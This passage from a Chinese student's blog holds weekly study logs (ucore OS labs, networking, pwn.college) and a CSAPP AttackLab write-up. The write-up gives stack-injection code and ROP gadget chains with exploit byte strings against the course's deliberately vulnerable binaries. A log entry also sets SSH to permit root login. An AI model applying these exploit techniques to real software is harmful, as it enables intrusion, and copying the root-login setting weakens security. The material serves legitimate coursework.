href="https://s3.amazonaws.com/builds.scitools.com/all_builds/b1029/Understand/Understand-5.1.1029-Linux-64bit.tgz">地址</a> </li><li><em>apt install <strong>gnome-terminal</strong>,</em> 调试得以继续运行</li><li><a href="https://stackoverflow.com/questions/5295903/how-many-bits-does-a-word-contain-in-32-64-bit-os-respectively">一个word有几位? / How many bits does a word contain in 32-bit OS?</a> </li><li><a href="https://www.zhihu.com/question/344805337/answer/819338479">pdf文件添加目录</a> </li><li>拓展内联汇编 <a href="https://www.cnblogs.com/thammer/p/12591383.html">link</a> </li><li>keymap调试完成</li></ul></li><li>python多版本问题 <a href="https://blog.csdn.net/weixin_39278265/article/details/82938270">link</a>: repaire或者<code>python -m pip install -U pip</code> 就行</li></ul><h3 id="第十九周-11-15-11-21"><a href="#第十九周-11-15-11-21" class="headerlink" title="第十九周: 11/15-11/21"></a>第十九周: 11/15-11/21</h3><ul><li>windows下vscode莫名无法拖动文件标签, 快捷方式设为管理员启动然后再取消掉就没事了</li><li>虚拟机里的vscode果然还是用的怪怪的, 换成windows下的写完再粘贴进去debug</li><li>终于挂载成功了, 问题不是vmware-tools没装好, 也不需要加载ISO文件, <code>sudo vmhgfs-fuse .host:/ /mnt/hgfs</code>不成功不是因为vmtools的问题, 而是和报错说的一模一样, <code>&#39;/mnt/hgfs&#39;: No such file or directory</code>. 真绝了, 新建个hgfs就完事了<br>悲报, 可能每次重启我都要执行这一句命令…….:sweat: </li><li><a href="https://blog.csdn.net/MACMACip/article/details/106406066">C语言变量声明时加冒号的用法</a>: C语言提供了一种数据结构，称为“位域”或“位段”</li><li>16号Lab1暂时完成, 开始下一个Lab的学习</li><li><a href="https://stackoverflow.com/questions/8564532/colon-in-c-struct-what-does-it-mean/85645973#answer-19691081">“:” (colon) and “.”(dot) in C struct</a> 结构体中的冒号和点号</li><li>c语言结构体名称和结构体变量<strong>可以同名</strong> </li><li>感觉gdb帮助也是有限, 一个调试还是要把代码看懂了再用gdb查看运行时变量的变化, 而且如果没有特殊情况还很难发现小错误</li></ul><h3 id="第二十周-11-22-11-28"><a href="#第二十周-11-22-11-28" class="headerlink" title="第二十周: 11/22-11/28"></a>第二十周: 11/22-11/28</h3><ul><li><a href="https://blog.csdn.net/rosetta/article/details/90746936">&amp;((type *)0)-&gt;member</a>: ANSI C标准允许值为0的常量被强制转换成任何一种类型的指针，并且转换的结果是个NULL，因此<code>((type *)0)</code>的结果就是一个类型为<code>type *</code>的NULL指针. 编译器还会对这种形式的宏定义做出优化, 只取出地址而不访问<br>(type *)NULL的成员member.</li><li>感觉是时候看一波网上的<a href="http://c.biancheng.net/asm/">汇编教程</a>了, 每天看一点就成, 免得看到一些指令还要一个一个搜</li><li>学的少了, 不过考完了全部期中考, 可以有更多时间来做了</li><li>周六<ul><li>整了正则替换, 像什么[0-9]*想了半天原来是0次到多次, 会匹配全文, 还是要熟练一下</li><li>弄了一点模型机, 意思一下</li></ul></li><li>周天<ul><li>三点前在整keymap和windows的vim, 总爱折腾这些东西, 不过配置好后还挺好用的 <a href="https://vimhelp.org/change.txt.html#%3Acopy">vim移动/复制行</a> <a href="https://vimhelp.org/motion.txt.html#%27%3C">可视模式选择的区域</a> </li><li>看了点汇编</li></ul></li></ul><h3 id="第二十一周-11-29-12-5"><a href="#第二十一周-11-29-12-5" class="headerlink" title="第二十一周: 11/29-12/5"></a>第二十一周: 11/29-12/5</h3><ul><li>看Lab3的视频中……</li><li>花了剩下的几天时间写完了学校的cpu, 并且完成了板上的时序仿真, 等待下周二的实板测试</li></ul><h3 id="第二十二周-12-6-12-12"><a href="#第二十二周-12-6-12-12" class="headerlink" title="第二十二周: 12/6-12/12"></a>第二十二周: 12/6-12/12</h3><ul><li>写CPU都适用的VIM, 找到了一个记录网站感觉挺有用 <a href="https://yyq123.github.io/learn-vim/">link</a>, 剩下的配置在_vimrc里, 解决了复制到系统剪贴板的问题和保存会话的问题</li><li>写了一周的CPU, 能运行程序了, 不过排个序都得要没有循环的八十多行的代码, 也是一绝</li><li>周三开始继续学操作系统</li><li>补了一下ucore的部分内容,  看了几天汇编语言, 对一些伪指令以及真实的汇编程序的结构有了认识, 对IDA反汇编的一些以前看不懂的东西也能读懂他的含义了</li><li>周六现学python的文件操作, 学了一点os, random, shutil库的函数, 还是有需求推动学的快</li><li>周天看CSAPP的处理器体系结构部分, 小有收获, 看的比较流畅</li></ul><h3 id="第二十三周-12-13-12-19"><a href="#第二十三周-12-13-12-19" class="headerlink" title="第二十三周: 12/13-12/19"></a>第二十三周: 12/13-12/19</h3><ul><li>花了几天看了CSAPP的处理器体系结构章节, 大有收获, 主要是pipeline processor的设计思考过程一步一步非常详细, 可以说是锻炼思维能力了, 但这只是1980s的理论水平</li><li>周四早上, 终于看完了Processor Architecture, 至于实验等假期再做吧, <u>继续开始操作系统内存管理部分</u> </li><li>周五, 操作系统Lab3, 安装了Windows default keymap, linux里的vscode勉强能用</li><li>可能需要切换一下策略, 直接参照答案学习, 理解写出文档就算成功, 不然看了两天才补完Lab1中的challenge, 还以为是task switch…</li><li>明天看看自动完成合并的diff和patch命令</li></ul><h3 id="第二十四周-12-20-12-26"><a href="#第二十四周-12-20-12-26" class="headerlink" title="第二十四周: 12/20-12/26"></a>第二十四周: 12/20-12/26</h3><p>本周的任务是操作系统, 一下是除了这个之外的小东西</p><ul><li>典中典: <strong>我以为我看懂了</strong> </li><li>STI指令: 响应可屏蔽的硬件中断, 在kern_init()中的intr_enable()执行, 就算没设置也能执行<strong>软中断</strong> </li><li>Typora崩溃了, 我也快崩溃了, 写了三天的东西莫得了, 自动保存直接断绝后路</li><li>完善了一下用来备份的bat程序, 每十分钟备份一次(我就是要自动保存!</li><li>c/c++默认返回值是<strong>1</strong>, 我没写导致出错</li><li>周三, 整了下快捷方式的快捷键; 学点patch和diff的补丁文件, 知识get!<ul><li>装了个tree包</li><li><a href="http://www.ruanyifeng.com/blog/2012/08/how_to_read_diff.html">diff输出文件</a> <a href="https://blog.csdn.net/longintchar/article/details/74151042">patch一般方法</a> <a href="https://blog.csdn.net/longintchar/article/details/74139933">diff一般方法</a> <code>patch -[R]pn &lt; 补丁文件</code> <code>diff -bruP [directory1] [directory2] &gt; [patchfilename.patch]</code> </li></ul></li><li>周四, 只能说那东西有点上头, 还是不碰为妙<ul><li><a href="https://www.zhihu.com/question/23014322">volatile相关</a> </li><li>ctrl+k在understand里面看大纲</li><li><a href="https://rtoax.blog.csdn.net/article/details/108663549">SLOB、SLAB、SLUB</a> </li></ul></li><li>周末:<ul><li>vscode的formatter用得顺手, 导致我diff+patch很难过T_T</li><li><strong>patch只能使用带有-u或者-c参数的diff文件</strong>, 而且带有上下文, patch很容易fail </li><li>vscode修改为大括号sameline: <code>&quot;C_Cpp.clang_format_style&quot;: &quot;&#123;BasedOnStyle: Chromium, IndentWidth: 4&#125;&quot;</code><br><a href="https://blog.csdn.net/softimite_zifeng/article/details/78357898">clang-format参数</a> </li></ul></li></ul><h3 id="第二十五周-12-27-1-2"><a href="#第二十五周-12-27-1-2" class="headerlink" title="第二十五周: 12/27-1/2"></a>第二十五周: 12/27-1/2</h3><ul><li>周一, 经典再现, 我果然没有看懂地址映射的四个阶段, 又重新看了一次ucore自带的一个设置好的页目录表和相应的页表<br>又折腾了半天</li><li>装了一个info包, 暂时只知道能看info ld</li><li><code>make grade</code>在虚拟机共享文件夹里出错了, 诶想省事又有点麻烦的东西</li><li>弄了一个多小时, 博客想加上汇编代码高亮, 没有成功, 和Typora的配合不是很好, 鸽了</li><li>Dirty COW的网站上有个东西好有趣<ul><li>How do I uninstall Linux? Please follow <a href="https://youtu.be/MZrdrfdAl44?t=14">these</a> instructions. </li></ul></li><li>VMware对于在虚拟机中选中的文本会自动复制到宿主机中</li><li>周四, ucore开始快一个月了, 进展到了Lab6</li><li>发现未知名词POC, 是<a href="https://github.com/knownsec/pocsuite3">pocsuite</a> </li><li>折腾了快一个小时, 结果发现需要update lab5的代码才能正确make qemu, 乌鱼子………为什么总在这种无意义的事情上浪费时间<ul><li>周五下午三点, 人已被气晕, exercise0怎么改都不行, 重新clone了肖佬的lab6, 绝了</li><li>发现肖佬是把出错的那一句直接注释了, 未曾设想的道路</li></ul></li><li>元旦当天, 不进行格式化的合并就是舒服 &amp;&amp; 尝试clash再次失败, 下次不弄了</li><li>装了一个apt install <a href="https://graphviz.org/">graphviz</a>, an open source graph visualization software</li><li>深受翻译版所害, signaling process直接叫做信号进程</li></ul><h3 id="第二十六周-1-3-1-9"><a href="#第二十六周-1-3-1-9" class="headerlink" title="第二十六周:1/3-1/9"></a>第二十六周:1/3-1/9</h3><ul><li>开始lab8</li><li>print working directory = pwd</li><li><a href="https://blog.csdn.net/weixin_40204595/article/details/81109644?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.no_search_link&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.no_search_link&utm_relevant_index=1">C语言宏定义中 ## 和#的作用</a> </li><li>magic numbers</li><li>这个highlightjs+hexo我不改变一下文件他就不动配置了, 搞得代码块白底白字, 还得手动在每个文件都加上一个空格.</li><li>do {…} while (0) 在宏定义中的作用: 能够正确的让多条语句按我们的意愿工作.</li><li>尝试了一下ssh连接虚拟机, 只要执行一下几条命令即可, 使用了一下XShell, 要弹出qemu的窗口还要装东西……<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">apt-get update<br>apt-get install openssh-server<br>systemctl <span class="hljs-built_in">enable</span> ssh.service<br>vim /etc/ssh/sshd_config <span class="hljs-comment"># 改成允许root用户登录</span><br>/etc/init.d/ssh restart<br></code></pre></div></td></tr></table></figure></li><li>要用understand记得要注意编码问题以及及时重新分析所有文件(windows默认GBK编码</li><li>周六, 虽然在复习周, 但是马上就要完成ucore了. <strong>周天, ucore完成</strong> </li><li>装上了ahk语法高亮, 硬是整了个小脚本</li></ul><hr><h2 id="开始寒假-pwn-college-计网"><a href="#开始寒假-pwn-college-计网" class="headerlink" title="开始寒假(pwn.college+计网)"></a>开始寒假(pwn.college+计网)</h2><h3 id="第二十七周-1-10-1-16"><a href="#第二十七周-1-10-1-16" class="headerlink" title="第二十七周:1/10-1/16"></a>第二十七周:1/10-1/16</h3><ul><li>gVim是vim的一种, 指GUI Vim, 还有其他的模式可以通过 vim -参数 来指定</li><li>考试周, 看了一点pwn.college的YouTube视频, 介绍视频感觉还挺多的, 是时候再写一篇blog了</li><li>对了, 每天要复习一点前面的东西, 不然到时候就等于重新看了</li><li>考完了, 考 完了, 考 完了, 16号开始一点计算机网络, 计算机系统, 和pwn.college<ul><li>找到了计算机网络书配套网站: <a href="https://media.pearsoncmg.com/aw/ecs_kurose_compnetwork_7/cw/">部分资源</a>以及<a href="http://gaia.cs.umass.edu/kurose_ross/index.php">主页</a>, 以及在Z-library上找到了英文第八版.</li><li><a href="http://gaia.cs.umass.edu/kurose_ross/eighth.php">第八版的改动</a> </li><li>别人的计网<a href="https://blog.csdn.net/wwj17647590781/category_11065625.html?spm=1001.2014.3001.5482">笔记</a> </li><li>研究笔记要怎么写用了一点时间, 干点别的去了</li></ul></li></ul><h3 id="第二十八周-1-17-1-23"><a href="#第二十八周-1-17-1-23" class="headerlink" title="第二十八周:1/17-1/23"></a>第二十八周:1/17-1/23</h3><ul><li><strong>17: 看计网, 明天开始pwn.college</strong> </li><li><strong>18:</strong> 找到了一个下载Github单个文件夹的<a href="https://downgit.github.io/#/home">网站</a>, 以及把tree/master替换为<strong>trunk</strong>. 然后用：svn checkout [source]</li><li>计网开始第二章, 第一章东西也真够多的</li><li>看一点concurrent programing….还有先后关系, 先看network programming…呃呃, 还是看system I/O吧…</li><li><strong>19:</strong> <a href="https://www.cnblogs.com/zy691357966/category/827251.html">CSAPP笔记</a>全markdown的狠人</li><li><a href="https://www.jianshu.com/p/9268ac2c8e5f">掩码</a>是个啥, Youtube<a href="https://www.edunews.net.cn/2020/hlw_0622/11069.html">快捷键</a> </li><li>看了CSAPP后几章和pwn.college.</li><li><strong>20:</strong> <a href="http://blog.chinaunix.net/uid-9474419-id-400907.html">/dev/tty和pty等等</a> </li><li>还在ELF格式中挣扎. </li><li><strong>21:</strong> Xshell的<a href="https://www.kali.org/docs/general-use/python3-transition/">警告信息</a>, 不想看, 只要<code>touch ~/.hushlogin</code>这个文件就可以隐藏了, 删除后又显示</li><li>看了一点computer networking</li><li>man手册还能<a href="https://www.cnblogs.com/chao1118/p/3715523.html">装中文</a>, 不想折腾了, 安排了<code>apt install manpages-dev</code>可以查看系统调用</li><li><strong>22:</strong> cc命令最终链接到gcc, 这是为了向后兼容</li><li>连pwn.college慢的一批, 也为了计算机系统课装个Ubuntu了, 再弄个clash</li><li>见识到了好多新的命令, linux有多的操作就写在Linux使用里吧.<ul><li>干脆把那个弄成清单, 然后具体细节写在每个WP里就可以了</li><li>runoob上的命令大全每天看一点得了, <strong>至少混个眼熟</strong> </li></ul></li><li><strong>23:</strong> 终于, 在ubuntu弄好了clash, 深深感到原理一个都不知道只会操作软件的痛苦….<a href="http://t.zoukankan.com/huang-xiang-p-13922394.html">link</a> </li><li>看计网</li></ul><h3 id="第二十九周-1-24-1-30"><a href="#第二十九周-1-24-1-30" class="headerlink" title="第二十九周 1/24-1/30"></a>第二十九周 1/24-1/30</h3><ul><li><strong>24:</strong> 继续很多的计网和一点pwn.college</li><li><strong>25:</strong> ASCII码中的<a href="https://en.wikipedia.org/wiki/C0_and_C1_control_codes#C1_controls">控制字符</a>就是按键盘上的Ctrl+字母符号来打出的,<br><strong>Caret(^) notation</strong> is a notation for unprintable control characters in ASCII encoding<br>The actual meaning or interpretation of the individual control-codes is not prescribed by the caret notation, and although the ASCII specification does give names to the control-codes, it does not prescribe how software should respond to them.</li><li>学了一波screen, <del>也不知道有啥用就是了…</del> , 真香.</li><li>快捷键没完没了了, <strong>一个终端还有这么多</strong> </li><li>pwn.college做到了(?)</li><li><strong>26:</strong> 一点点pwn.college和科目四</li><li><strong>27:</strong> pwn.college+computer networking</li><li>看了一篇PIPE&amp;FIFO的文章, 看不下去了话真的太多了, 也是佩服一篇博客需要这么多字的. <strong>还是linux manual管用</strong>.</li><li><strong>28-30</strong> 看计网和pwn.college.</li></ul><h3 id="第三十周-1-31-2-6"><a href="#第三十周-1-31-2-6" class="headerlink" title="第三十周 1/31-2/6"></a>第三十周 1/31-2/6</h3><ul><li>1/31: 除夕夜, 还在看计网. 看的属实有点慢.</li><li>2/1-2/2: 计网+春节.</li><li>2/3-4: 看书, 进度315/775</li><li>2/5: 连着看了几个小时看不下去了, 不重要的直接跳过不看了.</li></ul><h3 id="第三十一周-2-7-2-13"><a href="#第三十一周-2-7-2-13" class="headerlink" title="第三十一周: 2/7-2/13"></a>第三十一周: 2/7-2/13</h3><ul><li>2-8: 下午五点, 前六章看完. 巩固下知识(除了算法)</li><li>2-9-13: 终于看完了, (摸:fish:了一天)</li><li>开始pwn.college!</li></ul><h3 id="第三十二周-2-14-2-20"><a href="#第三十二周-2-14-2-20" class="headerlink" title="第三十二周: 2/14-2/20"></a>第三十二周: 2/14-2/20</h3><ul><li>14: 发现要自己写汇编代码, 之前看过的一部分还算用到了, 还好做了笔记不然和没看一样. 以前都是看现成的都没有自己写过.</li><li>python3.8特性: <a href="https://zhuanlan.zhihu.com/p/90992431">Assignment expressions</a>: <code>:=</code>和<code>=</code>是补充关系并不是替换关系</li><li><a href="https://cloud.tencent.com/developer/ask/106533">deadbeef渊源</a> 和<a href="https://en.wikipedia.org/wiki/Hexspeak">Hexspeak</a>有关系. 这个Hexspeak也挺有意思, 是用16进制数字来表示英文单词, 可用来编魔数.</li><li>15:  Linux的typora里双击或选中会自动删除文字居然是这个<a href="https://blog.csdn.net/litao31415/article/details/51082530">原因</a> </li><li>自己亲自动手写起汇编代码才发现这么多细节没有注意到, 要抓紧时间练练了, 这上面的题目还都比较基础嘞.</li><li>16: 还在pwn.college</li><li>Undefined Behavior -&gt; <a href="https://riptutorial.com/cplusplus/topic/1812/undefined-behavior">here</a> and <a href="https://blog.llvm.org/2011/05/what-every-c-programmer-should-know.html">here</a> <ul><li>signed overflow (which is undifined behavior) -&gt; <a href="https://www.airs.com/blog/archives/120">here</a> and <a href="https://stackoverflow.com/questions/18195715/why-is-unsigned-integer-overflow-defined-behavior-but-signed-integer-overflow-is">stackoverflow</a> </li></ul></li><li>17: 一点点的pc, shellcode injection又有好多的资料引用和视频, 全看完得几天时间(一天半就看完了)</li><li>18: 看完了pc的shellcode module视频, 引用文章看个两篇就结束了.</li><li>复习操作系统. ….到底需要一个何等庞大的基础知识体系啊……(tm拖了两天才要开始)</li><li>看了一点disk image的相关wikipedia: <a href="https://en.wikipedia.org/wiki/Disk_image">disk image</a> | <a href="https://en.wikipedia.org/wiki/Loop_device">loop deivce</a> | <a href="https://en.wikipedia.org/wiki/Device_file#Block_devices">device file</a> <ul><li>还有Disk image和optical disc image区别:<br>A disk image, in computing, is a computer file containing the contents and structure of a disk volume <strong>or of an entire data storage device</strong><br>An optical disc image <strong>is a disk image</strong> that contains everything that would be written to an <strong>optical disc</strong> </li><li>Once you’ve downloaded an ISO Image you can mount it as a loopback device. </li><li>It may be used to install an operating system onto a file system without repartitioning a disk.</li></ul></li><li>19-20: 回学校准备中, 不知道学了啥, 至少是复习了ucore</li></ul><h2 id="开学了-pc-编译原理"><a href="#开学了-pc-编译原理" class="headerlink" title="开学了!(pc+编译原理)"></a>开学了!(pc+编译原理)</h2><h3 id="第三十三周-2-21-2-27"><a href="#第三十三周-2-21-2-27" class="headerlink" title="第三十三周 : 2/21-2/27"></a>第三十三周 : 2/21-2/27</h3><ul><li>21:复习CS143, 今天或许能复习完. <ul><li>答案是不能, <strong>诶明天随便看看bison的东西吧. 然后再看看cscd70, 再然后看看LLVM IR Pass</strong> </li></ul></li><li>22: 如上所述, 主要看了CSCD70. 今天没有课.</li><li><a href="https://en.wikipedia.org/wiki/Compiler#Three-stage_compiler_structure">What is complier’s front end</a> 在课件里找到了, 一开始还去WiKi上查.</li><li>23: 继续CSCD70(看完了lecture 1)</li><li>an <strong>induction variable</strong> is a variable that gets increased or decreased by a fixed amount on every iteration of a loop or is a linear function of another induction variable.</li><li>不知道该不该看视频, 感觉优点在于能练习一点听力以及听一些问答, 缺点的话会慢一些, 不过这么一想倒是利大于弊了.</li><li>24: 继续CSCD70. 第三个视频看了一半多</li><li><a href="https://en.wikipedia.org/wiki/Number_sign#Mathematics">Number sign</a> in <code>#def</code>. It turns out to be the mathematic sign.</li><li>25: 看完第三个. 查了live variable analysis的作用.</li><li>还查了计算机系统小班课的第二个问题: 不同操作系统, 不同编译器, 不同处理系架构对生成目标文件的过程有什么影响.<ul><li>gcc由cc1, as, ld三个部分组成, 另外一个llvm把cc1模块化为三个部分, 然后正常汇编, 链接时可选optimization.</li><li>Clang只是一个front end.</li></ul></li><li>26-27: 查RFC中的ipv4和ipv6, 不知道在哪里有写. 还有C99待看</li><li>复习补充linux命令(操作系统小班课)</li><li>有空看下IBM网站, 上面好像挺多有用的博客资料啥的..</li><li>system programming in c or c++? -&gt; <a href="https://darkbears.com/blog/why-c-continues-to-the-preferred-systems-programming-language/">link</a> </li><li>这两天都在做计网实验, 要写c99程序和测试程序, 边翻文档编写是慢了点. 不如说我敲代码好像一直都慢了点…..</li></ul><h3 id="第三十四周-2-27-28"><a href="#第三十四周-2-27-28" class="headerlink" title="第三十四周: 2/27-28"></a>第三十四周: 2/27-28</h3><ul><li></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>schedule</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP_Lab</title>
    <link href="/2021-05/Learning-CSAPP-Lab/"/>
    <url>/2021-05/Learning-CSAPP-Lab/</url>
    
    <content type="html"><![CDATA[<h1 id="CSAPP-LAB"><a href="#CSAPP-LAB" class="headerlink" title="CSAPP_LAB"></a>CSAPP_LAB</h1><h2 id="AttackLab"><a href="#AttackLab" class="headerlink" title="AttackLab"></a>AttackLab</h2><blockquote><p>要会使用hex2raw和ctarget和rtarget, 用管道符号比较方便. </p></blockquote><h3 id="phase-1"><a href="#phase-1" class="headerlink" title="phase 1"></a>phase 1</h3><p>直接使用溢出的8字节改写为touch1的地址</p><h3 id="phase-2"><a href="#phase-2" class="headerlink" title="phase 2"></a>phase 2</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">touch2</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> val)</span></span>&#123;<br>    vlevel = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">if</span> (val == cookie)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);<br>        validate(<span class="hljs-number">2</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);<br>        fail(<span class="hljs-number">2</span>);<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">0:48 c7 c7 fa 97 b9 59  mov    $0x59b997fa,%rdi<br>9:68 ec 17 40 00       pushq  $0x4017ec<br>e:c3                   retq   <br></code></pre></div></td></tr></table></figure><p>此阶段需要执行栈上的代码, 在缓冲区里填充所写的代码后, 用gdb获得buf的栈顶, 覆盖getbuf的返回地址即可</p><h3 id="phase-3"><a href="#phase-3" class="headerlink" title="phase 3"></a>phase 3</h3><p>touch3函数里调用了hexmatch(cookie, sval), sval是char*类型且为touch3的第一个变量, 作用是比较字符串sval和cookie是否相同, 所以在调用touch3之前需要将%rdi设置为cookie的字符串形式, 即ASCII码值, 程序的大致运行过程如下:</p><ol><li><p>test=&gt;getbuf, 40字节的栈空间存放攻击代码, 内容为: 设置%rdi, 将touch3地址推到栈上, ret. 溢出的8字节为getbuf返回地址, 改写为攻击代码的首地址.</p><img src="../../image/CSAPP_Lab/afaadcb0e4f822d9c3f9a27ca83b01bf.png" alt="img" style="zoom:67%;" /></li><li><p>首地址获取方法: 用gdb调试设置断点到getbuf, 找到%rsp减去40后的值, 即为攻击代码地址</p></li><li><p>设置%rdi还要注意hexmatch的随机函数, 所以将输入的字符串存到getbuf返回地址的上方test代码段里, 与攻击代码距离40+8(返回地址)字节, 将该地址mov到%rdi里. 由于一次性使用程序, 不用关心test里的数据被改变</p></li></ol><h3 id="ROP-phase-4"><a href="#ROP-phase-4" class="headerlink" title="ROP: phase 4"></a>ROP: phase 4</h3><p>这一节实际上重复了phase2的任务, 但是使用了栈随机化和限制代码可执行区域, 所以采用ROP进行攻击.</p><p>使用objdump -s rtarget &gt; rtarget.s得到反汇编代码, 可以从handout中得知所需的gadget在以start_farm函数开始, 以mid_farm结束的一些函数中</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">0000000000401994 &lt;start_farm&gt;:<br>  401994:b8 01 00 00 00       mov    $0x1,%eax<br>  401999:c3                   retq  <br></code></pre></div></td></tr></table></figure><p>由于找不到直接pop %rdi的代码, 所以转向pop到其他寄存器然后mov到%rdi中, 这时候可以发现addval_219和addval_273中的58 90 c3, 48 89 c7 c3, 即pop %rax, mov %rax, %rdi(真tm就是直接找啊).</p><p>然后在buf里填充40字节空字符, 溢出的8字节定位到219, 从栈上pop出cookie, ret(0xc3)指令从栈上弹出一个地址即273的地址, 执行完mov后再ret, 最终跳转到touch2.</p><img src="../../image/CSAPP_Lab/0.png" style="zoom:60%;" /><p>exploit code:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00 ==&gt;40字节<br>ab 19 40 00 00 00 00 00<br>fa 97 b9 59 00 00 00 00<br>a2 19 40 00 00 00 00 00<br>ec 17 40 00 00 00 00 00<br></code></pre></div></td></tr></table></figure><p>结束.</p><h3 id="phase5"><a href="#phase5" class="headerlink" title="phase5"></a>phase5</h3><blockquote><p>Official Warning : If you have other pressing obligations consider stopping right now.</p><p>重复了phase3的任务.Figure 3D就和nop一样, 不改变任何东西, 可以无视.</p></blockquote><p>由于使用了栈随机化, 又需要把cookie的地址放到栈上产生地址, 再存到%rdi中, 所以需要使用一些代码组合来产生一个固定偏移量的栈地址.<strong>有两种方法:</strong> </p><ol><li><p>使用handout里面给出的那些编码, 代码较长所以才说费时间</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">;in addval_190<br>movq %rsp,%rax<br>ret<br>;in addval_426<br>movq %rax,%rdi<br>ret<br>;in addval_219<br>popq %rax<br>ret<br>;in getval_481<br>movl %eax,%edx<br>ret<br>;in getval_159<br>movl %edx,%ecx<br>ret<br>;in addval_436<br>movl %ecx,%rsi<br>ret<br>;in add_xy<br>lea (%rdi,%rsi,1),%rax<br>retq <br>;in addval_426<br>movq %rax,%rdi<br>ret<br></code></pre></div></td></tr></table></figure><p>%rsp+80处放字符串，%rsp+8处才开始执行addval_190. 所以 <strong>(%rsp+80)-(%rsp+8)=72=0x48</strong></p></li><li><p>使用add指令的编码, 使得实际只需三行汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">0000000000401a03 &lt;addval_190&gt;:<br>  401a03: 8d 87 41 48 89 e0     lea    -0x1f76b7bf(%rdi),%eax<br>  401a09: c3                    retq<br>00000000004019d6 &lt;add_xy&gt;:<br>  4019d6: 48 8d 04 37           lea    (%rdi,%rsi,1),%rax<br>  4019da: c3                    retq<br>00000000004019a0 &lt;addval_273&gt;:<br>  4019a0: 8d 87 48 89 c7 c3     lea    -0x3c3876b8(%rdi),%eax<br>  4019a6: c3                    retq<br></code></pre></div></td></tr></table></figure><p>提取后:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">401a06: 48 89 e0              movq %rsp, %rax<br>401a09: c3                    retq<br><br>4019d8: 04 37                 add 0x37, %al<br>4019da: c3                    retq<br><br>4019a2: 48 89 c7              movq %rax, %rdi<br>4019a5: c3                    retq<br></code></pre></div></td></tr></table></figure><p>结束.</p></li></ol><h2 id="Cache-Lab"><a href="#Cache-Lab" class="headerlink" title="Cache Lab"></a>Cache Lab</h2><h3 id="1-Part-A"><a href="#1-Part-A" class="headerlink" title="1)Part A"></a>1)Part A</h3><p>就，没什么可说的，白嫖真香。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 